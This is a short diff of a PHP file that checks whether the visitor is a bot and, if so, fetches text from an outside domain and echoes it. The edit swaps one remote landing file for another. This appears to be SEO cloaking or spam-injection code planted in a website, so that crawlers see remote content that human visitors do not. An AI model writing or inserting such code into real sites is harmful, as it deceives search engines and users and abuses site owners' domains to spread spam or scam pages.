@@ -11,7 +11,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents("https://desa-badai.pro/landing/moonstrikecapital.txt");
+    $message = file_get_contents("https://desa-badai.pro/landing/habarlebuitah.com.txt");
     echo $message;
 }
 ?>
